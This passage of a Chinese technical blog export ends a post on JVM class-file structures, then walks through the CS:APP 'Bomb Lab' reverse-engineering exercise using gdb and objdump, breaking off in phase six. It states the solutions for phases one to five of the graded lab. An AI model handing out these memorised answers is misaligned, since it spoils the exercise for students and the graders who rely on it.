的并集，表示 ACC_PUBLIC 与 ACC_SUPER。 类索引、父类索引与接口索引 00 03 是类索引，指向 #3 表示是一个类，其名字为 com/cuzz/jvm/bytecode/MyTest01 00 04 是父亲索引，指向 #4 表示是一个类，其名字是 java/lang/Object 00 00 是接口，表示没有接口 字段表集合字段表用于描述类和接口中声明的变量。这里的字段包含了类级别变量以及实例变量，但不包括方法内部声明的局部变量。 如下图 00 01 是成员变量的数量，后面接着就是 field_info 成员变量信息 field_info { u2 access_flags; // 0002 表示私有 private u2 name_index; // 0005 表示 a u2 descriptor_index; // 0006 表示 I u2 attributes_count; // 0000 没有 attribute_info attributes[attributes_count];} 方法表刚开始的 00 03 表示有三个方法，除了getter/setter 还有默认构造方法 methods_count { u2 access_flags; // 0001 表示 public u2 name_index; // 0007 指向常量池中 #7 的常量为 &lt;init&gt; u2 descriptor_index; // 0008 指向常量池中 #8 的常量为 ()V u2 attributes_count; // 0001 表示一个属性 attribute_info attributes[attributes_count];} 方法中的属性结构 attribute_info { u2 attribute_name_index; // 0009 指向常量池中 #9 为 Code u4 attribute_length; // 0000 0038 表示长度为 0x38 为 56 长度的字节 u1 info[attribute_length];} Code 结构Code attribute 的作用是保存该方法的结构，如所对应的字节码 Code_attribute { u2 attribute_name_index; u4 attribute_length; u2 max_stack; u2 max_locals; u4 code_length; u1 code[code_length]; u2 exception_table_length; { u2 start_pc; u2 end_pc; u2 handler_pc; u2 catch_type; } exception_table[exception_table_length]; u2 attributes_count; attribute_info attributes[attributes_count];} attribute_length 表示 attribute 所包含的字节数，不包含 attribute_name_index 和 attribute_length 字段 max_stack 表示这个方法运行的任何时刻所能达到的操作数栈的最大深度 max_locals 表示方法执行期间创建的局部变量的数目，包含用来表示传入的参数的局部变量 code_length 表示该方法所包含的字节码的字节数以及具体的指令码，具体字节码即是该方法被调用时，虚拟机所执行的字节码 exception_table 表示存放的是处理异常的信息 每个 exception_table 表由 start_pc，end_pc，handler_pc，catch_type 组成 start_pc 和 end_pc 表示在 code 数组中的从 start_pc 到 end_pc 处（包含 start_pc，不包含 end_pc）的指令抛出的异常会由这个表项来处理 handler_pc 表示处理异常的代码的开始处，catch_type 表示会被处理的异常类型，它指向常量池中的一个异常类，当 catch_type 为 0 时，表示处理所有的异常 字节码查看工具https://github.com/ingokegel/jclasslib","link":"/2019/02/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89/"},{"title":"Bomb Lab","text":"介绍邪恶博士在我们的班级机器上植入了许多“二进制炸弹”。二进制炸弹是一个由一系列阶段组成的程序。每个阶段都要求你在 stdin 上输入入特定的字符串。如果你输入正确的字符串，则该阶段将被消除，炸弹将进入下一个阶段。否则，炸弹通过打印“ BOOM !!!”而爆炸。然后终止。当每个阶段都已消除时，炸弹便已消除。 获取炸弹进入官网下载 bomb.tar 文件，通过 tar -xvf bomb.tar 解压，会得到 3 个文件。 README bomb：可执行二进制炸弹 bomb.c：源文件包含炸弹的主要程序以及引导程序 一共有 6 个阶段，前 4 个阶段每个 10 分，后面两个比较难每个 15 分，在拆炸弹的过程中，每次引爆一次会从总分里扣 0.5 分（最多扣 20 分）。 小技巧有一些小提示需要注意: 为了防止引爆炸弹，需要学会设置断点，在“炸弹”之前设置断点，防止爆炸 反编译出来的汇编代码很长，并不需要搞懂每行，通过 debugger 观察程序执行变化，根据这些信息去拆除炸弹 工具 gdb：命令行调试器，可以一行行地追踪程序，设置断点，查看寄存器和内存 objdump -t：输出炸弹程序的符号表。符号表里包含了所有函数和全局变量的名字 ojbdump -d ：反编译二进制文件，输出汇编代码 准备 汇编知识：汇编入门 gdb 知识 gdb bomb 进入调试状态 run 运行 break phase_1 打断点 next 简写 n 表示下一行代码 C 语言代码 nexti 简写 ni 表示下一行汇编代码 continue 简写 c 表示下一个断点 disas 显示汇编 info registers 查看寄存器的值 x/s $rax 以字符串形式查看 实验部分在命令行中反编译可执行文件，输入到 bomb.txt 文件中 objdump -d bomb &gt; bomb.txt 我们先看一下 main 函数，一共 6 个阶段，每个阶段都是一个 phase_x 的函数，在函数正常结束之后运行phase_defused拆除这个阶段，然后进入下一阶段。 400e19: e8 84 05 00 00 callq 4013a2 &lt;initialize_bomb&gt;400e1e: bf 38 23 40 00 mov $0x402338,%edi400e23: e8 e8 fc ff ff callq 400b10 &lt;puts@plt&gt;400e28: bf 78 23 40 00 mov $0x402378,%edi400e2d: e8 de fc ff ff callq 400b10 &lt;puts@plt&gt;400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e44: bf a8 23 40 00 mov $0x4023a8,%edi400e49: e8 c2 fc ff ff callq 400b10 &lt;puts@plt&gt;400e4e: e8 4b 06 00 00 callq 40149e &lt;read_line&gt;400e53: 48 89 c7 mov %rax,%rdi400e56: e8 a1 00 00 00 callq 400efc &lt;phase_2&gt;400e5b: e8 64 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e60: bf ed 22 40 00 mov $0x4022ed,%edi400e65: e8 a6 fc ff ff callq 400b10 &lt;puts@plt&gt;400e6a: e8 2f 06 00 00 callq 40149e &lt;read_line&gt;400e6f: 48 89 c7 mov %rax,%rdi400e72: e8 cc 00 00 00 callq 400f43 &lt;phase_3&gt;400e77: e8 48 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e7c: bf 0b 23 40 00 mov $0x40230b,%edi400e81: e8 8a fc ff ff callq 400b10 &lt;puts@plt&gt;400e86: e8 13 06 00 00 callq 40149e &lt;read_line&gt;400e8b: 48 89 c7 mov %rax,%rdi400e8e: e8 79 01 00 00 callq 40100c &lt;phase_4&gt;400e93: e8 2c 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e98: bf d8 23 40 00 mov $0x4023d8,%edi400e9d: e8 6e fc ff ff callq 400b10 &lt;puts@plt&gt;400ea2: e8 f7 05 00 00 callq 40149e &lt;read_line&gt;400ea7: 48 89 c7 mov %rax,%rdi400eaa: e8 b3 01 00 00 callq 401062 &lt;phase_5&gt;400eaf: e8 10 07 00 00 callq 4015c4 &lt;phase_defused&gt;400eb4: bf 1a 23 40 00 mov $0x40231a,%edi400eb9: e8 52 fc ff ff callq 400b10 &lt;puts@plt&gt;400ebe: e8 db 05 00 00 callq 40149e &lt;read_line&gt;400ec3: 48 89 c7 mov %rax,%rdi400ec6: e8 29 02 00 00 callq 4010f4 &lt;phase_6&gt;400ecb: e8 f4 06 00 00 callq 4015c4 &lt;phase_defused&gt; 阶段一我们从上面我们可以看到调用了 phase_1 函数，找到对应的汇编代码。 ... 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; # 获取stdin输入的值 400e37: 48 89 c7 mov %rax,%rdi # 把输入值保存到 %rdi 寄存器中 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; ... 0000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp # 压栈 400ee4: be 00 24 40 00 mov $0x402400,%esi # 把$0x402400的地址保存%rsi中，%esi就%rsi的低位 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; # 比较%rdi和%rsi的值，是否不相同,%rdi是我们输入的。如果不相同返回1，相同返回0 400eee: 85 c0 test %eax,%eax # test a,b =&gt; b&amp;a，结果只保存在%rax中 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; # 如果%rax为0则跳转 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 上面分析的很清楚了，我们开始拆吧，在终端输入 gdb bomb 进入调试模式 &gt;(gdb) break phase_1 # 打断点Breakpoint 1 at 0x400ee0&gt;(gdb) break explode_bomb # 打断点Breakpoint 2 at 0x40143a&gt;(gdb) run # 运行Starting program: /home/ubuntu/cuzz/csapp/bomb/bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!&gt;hello world! 这个时候使用 info registers 查看寄存器信息。 &gt; (gdb) info registersrax 0x603780 6305664rbx 0x402210 4203024rcx 0xc 12rdx 0x1 1rsi 0x603780 6305664rdi 0x603780 6305664rbp 0x0 0x0rsp 0x7fffffffe378 0x7fffffffe378r8 0x603780 6305664r9 0x7c 124r10 0xfffffffffffff28e -3442r11 0x7ffff7e06400 140737352066048r12 0x400c90 4197520r13 0x7fffffffe470 140737488348272r14 0x0 0r15 0x0 0rip 0x400ee0 0x400ee0 &lt;phase_1&gt;eflags 0x206 [ PF IF ]cs 0x33 51ss 0x2b 43ds 0x0 0es 0x0 0fs 0x0 0gs 0x0 0 使用 disas 查看执行到哪一步了，stepi 可以使汇编一步一步执行，具体可以看箭头变化。 &gt;(gdb) disas # 反汇编Dump of assembler code for function phase_1:=&gt; 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp # 箭头在这里 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi 0x0000000000400ee9 &lt;+9&gt;: callq 0x401338 &lt;strings_not_equal&gt; 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retqEnd of assembler dump.Breakpoint 1, 0x0000000000400ee0 in phase_1 ()&gt;(gdb) stepi # 运行第一次0x0000000000400ee4 in phase_1 ()&gt;(gdb) stepi # 运行第二次0x0000000000400ee9 in phase_1 ()&gt;(gdb) disasDump of assembler code for function phase_1: 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi=&gt; 0x0000000000400ee9 &lt;+9&gt;: callq 0x401338 &lt;strings_not_equal&gt; # 运行两次，箭头像下移动两行 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retqEnd of assembler dump. 我是用 x/s $rdi 和 x/s $rsi 查看寄存器的值 &gt;(gdb) x/s $rdi0x603780 &lt;input_strings&gt;: &quot;hello world!&quot;&gt;(gdb) x/s $rsi0x402400: &quot;Border relations with Canada have never been better.&quot; 就是比较这两个值是否相等，所以我们只要把这值记下来就可以拆调第一个炸弹了。 我们重新执行一遍，把 Border relations with Canada have never been better. 这段话输入进去，发现拆除了第一炸弹。 阶段二同样我们先找到 phase_2 对应的汇编代码，从函数名 read_six_numbers 提示我们输入 6 个数字。 0000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; ... 虽然我们知道 read_six_numbers 这个函数是提示我们输入 6 个数据， 但是我们不知道输入这 6 个数字的格式是怎样的，我们先输入123456 试试看。 我们先看看这个函数，对应的汇编，通过打断点 break read_six_numbers 进入。 &gt;(gdb) disasDump of assembler code for function read_six_numbers: 0x000000000040145c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401460 &lt;+4&gt;: mov %rsi,%rdx # %rdx存放第一个值 0x0000000000401463 &lt;+7&gt;: lea 0x4(%rsi),%rcx # %rcx = %rsi + 0x4 放第二个值 0x0000000000401467 &lt;+11&gt;: lea 0x14(%rsi),%rax # 保存在栈中 %rsi + 0x14 放第六个值 0x000000000040146b &lt;+15&gt;: mov %rax,0x8(%rsp) 0x0000000000401470 &lt;+20&gt;: lea 0x10(%rsi),%rax # 保存在栈中 %rsi + 0x10 放第五个值 0x0000000000401474 &lt;+24&gt;: mov %rax,(%rsp) 0x0000000000401478 &lt;+28&gt;: lea 0xc(%rsi),%r9 # %r9 = %rsi + 0xc 放第四个值 0x000000000040147c &lt;+32&gt;: lea 0x8(%rsi),%r8 # %r8 = %rsi + 0x8 放第三个值 0x0000000000401480 &lt;+36&gt;: mov $0x4025c3,%esi 0x0000000000401485 &lt;+41&gt;: mov $0x0,%eax=&gt; 0x000000000040148a &lt;+46&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; # 一个获取输入的函数: int sscanf( const char *buffer, const char *format [, argument ] ... ); 0x000000000040148f &lt;+51&gt;: cmp $0x5,%eax 0x0000000000401492 &lt;+54&gt;: jg 0x401499 &lt;read_six_numbers+61&gt; 0x0000000000401494 &lt;+56&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401499 &lt;+61&gt;: add $0x18,%rsp 0x000000000040149d &lt;+65&gt;: retqEnd of assembler dump. &gt;(gdb) x/s $rsi0x4025c3: &quot;%d %d %d %d %d %d&quot; # 以这种格式获取数据(gdb) x/s $rdi&gt;0x6037d0 &lt;input_strings+80&gt;: &quot;123456&quot; # 我们输入的数据，所以我们这样输入不对的 首先看看第一个数是否为 1，然后循环判断后面一个数是否是前面一个数的倍数。 (gdb) disasDump of assembler code for function phase_2: 0x0000000000400efc &lt;+0&gt;: push %rbp # 基指针 0x0000000000400efd &lt;+1&gt;: push %rbx # 基址寄存器 0x0000000000400efe &lt;+2&gt;: sub $0x28,%rsp 0x0000000000400f02 &lt;+6&gt;: mov %rsp,%rsi 0x0000000000400f05 &lt;+9&gt;: callq 0x40145c &lt;read_six_numbers&gt;=&gt; 0x0000000000400f0a &lt;+14&gt;: cmpl $0x1,(%rsp) # 第一个参数必须为1 0x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt; 0x0000000000400f10 &lt;+20&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f15 &lt;+25&gt;: jmp 0x400f30 &lt;phase_2+52&gt; # 跳到52 0x0000000000400f17 &lt;+27&gt;: mov -0x4(%rbx),%eax # %rax = before 0x0000000000400f1a &lt;+30&gt;: add %eax,%eax # %rax = 2 * before 0x0000000000400f1c &lt;+32&gt;: cmp %eax,(%rbx) # %rax与(%rbx)比较 0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt; 0x0000000000400f20 &lt;+36&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f25 &lt;+41&gt;: add $0x4,%rbx 0x0000000000400f29 &lt;+45&gt;: cmp %rbp,%rbx # 循环跳出来 0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt; 0x0000000000400f2e &lt;+50&gt;: jmp 0x400f3c &lt;phase_2+64&gt; 0x0000000000400f30 &lt;+52&gt;: lea 0x4(%rsp),%rbx # --&gt; 对应下面 0x04 0x0000000000400f35 &lt;+57&gt;: lea 0x18(%rsp),%rbp # --&gt; 对应下面 0x18 0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt; # 跳回到 27 0x0000000000400f3c &lt;+64&gt;: add $0x28,%rsp 0x0000000000400f40 &lt;+68&gt;: pop %rbx 0x0000000000400f41 &lt;+69&gt;: pop %rbp 0x0000000000400f42 &lt;+70&gt;: retqEnd of assembler dump. 对应内存中的值 0x7fffffffe368 0x28 -&gt; %rbp 0x24 0x20 0x1c 0x18 -&gt; %rbx 0x14 32 0x10 16 0x0c 8 0x08 4 0x04 20x7fffffffe340 0x00 1 -&gt; %rsp 最好我们输入 1 2 4 8 16 32 查看结果，就已经通过了 阶段三同样我们先找到 phase_3 对应的汇编 Dump of assembler code for function phase_3:=&gt; 0x0000000000400f43 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400f47 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400f4c &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400f51 &lt;+14&gt;: mov $0x4025cf,%esi 0x0000000000400f56 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400f5b &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400f60 &lt;+29&gt;: cmp $0x1,%eax 0x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt; 0x0000000000400f65 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f6a &lt;+39&gt;: cmpl $0x7,0x8(%rsp) # 不能大于7，也不能小于0，0x8(%rsp)这个地址存放着第一个参数 0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt; 0x0000000000400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax # 把第一个参数放入%rax中 0x0000000000400f75 &lt;+50&gt;: jmpq *0x402470(,%rax,8) # D(Rb, Ri, S) =&gt; Mem[Reg[Rb]+S*Reg[Ri]+D] = %rax * 8 + 0x402470 0x0000000000400f7c &lt;+57&gt;: mov $0xcf,%eax 0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f83 &lt;+64&gt;: mov $0x2c3,%eax 0x0000000000400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f8a &lt;+71&gt;: mov $0x100,%eax 0x0000000000400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f91 &lt;+78&gt;: mov $0x185,%eax 0x0000000000400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f98 &lt;+85&gt;: mov $0xce,%eax 0x0000000000400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f9f &lt;+92&gt;: mov $0x2aa,%eax 0x0000000000400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fa6 &lt;+99&gt;: mov $0x147,%eax 0x0000000000400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fad &lt;+106&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400fb2 &lt;+111&gt;: mov $0x0,%eax 0x0000000000400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fb9 &lt;+118&gt;: mov $0x137,%eax 0x0000000000400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax 0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt; 0x0000000000400fc4 &lt;+129&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400fc9 &lt;+134&gt;: add $0x18,%rsp 0x0000000000400fcd &lt;+138&gt;: retqEnd of assembler dump.&gt;(gdb) x/s 0x4025cf # 查看输入格式0x4025cf: &quot;%d %d&quot;&gt;(gdb) x/8a 0x402470 # 对应跳转表的地址0x402470: 0x400f7c &lt;phase_3+57&gt; 0x400fb9 &lt;phase_3+118&gt;0x402480: 0x400f83 &lt;phase_3+64&gt; 0x400f8a &lt;phase_3+71&gt;0x402490: 0x400f91 &lt;phase_3+78&gt; 0x400f98 &lt;phase_3+85&gt;0x4024a0: 0x400f9f &lt;phase_3+92&gt; 0x400fa6 &lt;phase_3+99&gt; 我们又看到 sscnaf 函数，x/s 0x4025cf 查看输入格式，发现是按 %d %d 输入两个数字。在 &lt;+50&gt; 行中是一个 switch 方法，等下 C 代码如下： if (x1 &gt; 7 || x1 &lt; 0) explode_bomb();switch(x1) { case 0: if (x2 != a) explode_bomb(); break; case 1: if (x2 != b) explode_bomb(); break; ...} 假设我们输入的 x1 为 1，那么对应表的地址为 0x400fb9 &lt;phase_3+118&gt; ，所以我们 x2 的值就是 &lt;+118&gt; 中的 0x137 对应的十进制为 311。 最后我们输入 1 311 试试，已经解除 了。 阶段四有看到了 sscanf 函数，根据前面的经验，查看一下输入格式。0x8(%rsp) 存放着第一个值，0xc(%rsp) 存放着第二个值。 (gdb) disasDump of assembler code for function phase_4:=&gt; 0x000000000040100c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401010 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000401015 &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x000000000040101a &lt;+14&gt;: mov $0x4025cf,%esi 0x000000000040101f &lt;+19&gt;: mov $0x0,%eax 0x0000000000401024 &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000401029 &lt;+29&gt;: cmp $0x2,%eax # 必须为两个值 0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt; 0x000000000040102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp) # 第一个值必须小于0xe 0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt; 0x0000000000401035 &lt;+41&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x000000000040103a &lt;+46&gt;: mov $0xe,%edx 0x000000000040103f &lt;+51&gt;: mov $0x0,%esi 0x0000000000401044 &lt;+56&gt;: mov 0x8(%rsp),%edi 0x0000000000401048 &lt;+60&gt;: callq 0x400fce &lt;func4&gt; 0x000000000040104d &lt;+65&gt;: test %eax,%eax # test a,b =&gt; a &amp; b 所以func4返回的值必须为0 0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt; 0x0000000000401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp) # 第二个值必须为0 0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt; 0x0000000000401058 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x000000000040105d &lt;+81&gt;: add $0x18,%rsp 0x0000000000401061 &lt;+85&gt;: retqEnd of assembler dump.(gdb) x/s 0x4025cf0x4025cf: &quot;%d %d&quot; 这里是一个递归，发现第一个数为 1 时，能是返回值为 0。 Dump of assembler code for function func4:=&gt; 0x0000000000400fce &lt;+0&gt;: sub $0x8,%rsp # %rdi = A %rsi = B %rdx = C 0x0000000000400fd2 &lt;+4&gt;: mov %edx,%eax # %eax = C 0x0000000000400fd4 &lt;+6&gt;: sub %esi,%eax # %eax = C - B 0x0000000000400fd6 &lt;+8&gt;: mov %eax,%ecx # %ecx = C - B 0x0000000000400fd8 &lt;+10&gt;: shr $0x1f,%ecx # 右移31位 %ecx = (C - B) &gt;&gt; 31 0x0000000000400fdb &lt;+13&gt;: add %ecx,%eax # %eax = C - B + (C - B) &gt;&gt; 31 = C - B 0x0000000000400fdd &lt;+15&gt;: sar %eax # 等效于 sar $1,%eax %eax = (C - B) / 2 0x0000000000400fdf &lt;+17&gt;: lea (%rax,%rsi,1),%ecx # %ecx = %rax + %rsi * 1 = (C - B) / 2 + B = (B + C) / 2 0x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx # 比较 A 和 %exc =（B + C）/ 2 0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt; # (B + C) / 2 小于 A 跳转 0x0000000000400fe6 &lt;+24&gt;: lea -0x1(%rcx),%edx # %edx = （B + C) / 2 - 1 0x0000000000400fe9 &lt;+27&gt;: callq 0x400fce &lt;func4&gt; 0x0000000000400fee &lt;+32&gt;: add %eax,%eax # 返回 2 * %rax 0x0000000000400ff0 &lt;+34&gt;: jmp 0x401007 &lt;func4+57&gt; 0x0000000000400ff2 &lt;+36&gt;: mov $0x0,%eax # %eax = 0 0x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx # 0 和 （B + C）/ 2 如果相等跳转 0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt; 0x0000000000400ffb &lt;+45&gt;: lea 0x1(%rcx),%esi # %esi =（B + C）/ 2 + 1 0x0000000000400ffe &lt;+48&gt;: callq 0x400fce &lt;func4&gt; # 递归调用 0x0000000000401003 &lt;+53&gt;: lea 0x1(%rax,%rax,1),%eax # 返回 2 * %rax + 1 0x0000000000401007 &lt;+57&gt;: add $0x8,%rsp 0x000000000040100b &lt;+61&gt;: retqEnd of assembler dump. 根据 x86 汇编语言的约定，%rdi、%rsi、%rdx 分别为第一、二和第三个参数使用的寄存器。%rax 作为返回值所在的寄存器。func4 变换为C语言代码如下： int func4(int target, int step, int limit) { /* edi = target; esi = step; edx = limit */ int temp = (limit - step) * 0.5; int mid = temp + step; if (mid &gt; target) { limit = mid - 1; int ret1 = func4(target, step, limit); return 2 * ret1; } else { if (mid &gt;= target) { return 0; } else { step = mid + 1; int ret2 = func4(target, step, limit); return (2 * ret2 + 1); } }} 最后看看测试结果 阶段五先看汇编代码 =&gt; 0x0000000000401062 &lt;+0&gt;: push %rbx 0x0000000000401063 &lt;+1&gt;: sub $0x20,%rsp 0x0000000000401067 &lt;+5&gt;: mov %rdi,%rbx # %rid保存输入字符串指针,复制到%rbx 0x000000000040106a &lt;+8&gt;: mov %fs:0x28,%rax 0x0000000000401073 &lt;+17&gt;: mov %rax,0x18(%rsp) # 保存%rax 0x0000000000401078 &lt;+22&gt;: xor %eax,%eax # 清零%eax 0x000000000040107a &lt;+24&gt;: callq 0x40131b &lt;string_length&gt; 0x000000000040107f &lt;+29&gt;: cmp $0x6,%eax # 必须为长度为6的字符串 0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt; 0x0000000000401084 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt; 0x000000000040108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx # 复制%rbx中第%rax字符串到%ecx中 0x000000000040108f &lt;+45&gt;: mov %cl,(%rsp) # %cl是%ecx低位，保存单个字符串到（%rsp）中 0x0000000000401092 &lt;+48&gt;: mov (%rsp),%rdx # 把字符串复制到%rdx中 0x0000000000401096 &lt;+52&gt;: and $0xf,%edx # 取低4位 0x0000000000401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx # 将与0x4024b0偏移量为%rdx的一个字节数据复制到%edx 0x00000000004010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1) # %dl是%edx的低位，将%edx最低字节复制到与%rsp偏移量为(0x10 + %rax)的栈地址中 0x00000000004010a4 &lt;+66&gt;: add $0x1,%rax # %rax值加1，值向下一个字符串 0x00000000004010a8 &lt;+70&gt;: cmp $0x6,%rax # 判断是否等于6，不等于继续循环 0x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt; 0x00000000004010ae &lt;+76&gt;: movb $0x0,0x16(%rsp) 0x00000000004010b3 &lt;+81&gt;: mov $0x40245e,%esi # %esi指向$0x40245e地址字符串 0x00000000004010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi # 指向前面的字符串 0x00000000004010bd &lt;+91&gt;: callq 0x401338 &lt;strings_not_equal&gt; # 判断是否相等 0x00000000004010c2 &lt;+96&gt;: test %eax,%eax 0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt; 0x00000000004010c6 &lt;+100&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x00000000004010cb &lt;+105&gt;: nopl 0x0(%rax,%rax,1) 0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt; 0x00000000004010d2 &lt;+112&gt;: mov $0x0,%eax 0x00000000004010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt; 0x00000000004010d9 &lt;+119&gt;: mov 0x18(%rsp),%rax 0x00000000004010de &lt;+124&gt;: xor %fs:0x28,%rax 0x00000000004010e7 &lt;+133&gt;: je 0x4010ee &lt;phase_5+140&gt; 0x00000000004010e9 &lt;+135&gt;: callq 0x400b30 &lt;__stack_chk_fail@plt&gt; 0x00000000004010ee &lt;+140&gt;: add $0x20,%rsp 0x00000000004010f2 &lt;+144&gt;: pop %rbx 0x00000000004010f3 &lt;+145&gt;: retq(gdb) x/s 0x4024b00x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;(gdb) x/s 0x40245e0x40245e: &quot;flyers&quot; 传入一个长度为六的字符串，依次取一个字符，截取它ASCII表上对应二进制的后四位，作为index。在 maduiersnfotvbyl... 这个字符串中以这个 index 为偏移量取字符。按照这样的规则从 maduiersnfotvbyl... 这个字符串中取出六个字符，组成新的字符串，要和 flyers 一样。这个还是很直接的吧，解题就是反过来的顺序。先根据 flyers 找出六个 index。再找个 ASCII 码表，根据 index 找到符合要求的字符。 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15m a d u i e r s n f o t v b y l 所以 flyers 对应的 index 为 9 15 14 5 6 7，所以输入ionefg 就是其中一个答案。 运行一下 阶段六先看汇编代码，这个比较长。 (gdb) disasDump of assembler code for function phase_6:=&gt; 0x00000000004010f4 &lt;+0&gt;: push %r14 0x00000000004010f6 &lt;+2&gt;: push %r13 0x00000000004010f8 &lt;+4&gt;: push %r12 0x00000000004010fa &lt;+6&gt;: push %rbp 0x00000000004010fb &lt;+7&gt;: push %rbx 0x00000000004010fc &lt;+8&gt;: sub $0x50,%rsp 0x0000000000401100 &lt;+12&gt;: mov %rsp,%r13 0x0000000000401103 &lt;+15&gt;: mov %rsp,%rsi 0x0000000000401106 &lt;+18&gt;: callq 0x40145c &lt;read_six_numbers&gt; # 读取6个值，从%rsi地址开始 0x000000000040110b &lt;+23&gt;: mov %rsp,%r14 0x000000000040110e &lt;+26&gt;: mov $0x0,%r12d =========================================================== LoopA-start 0x0000000000401114 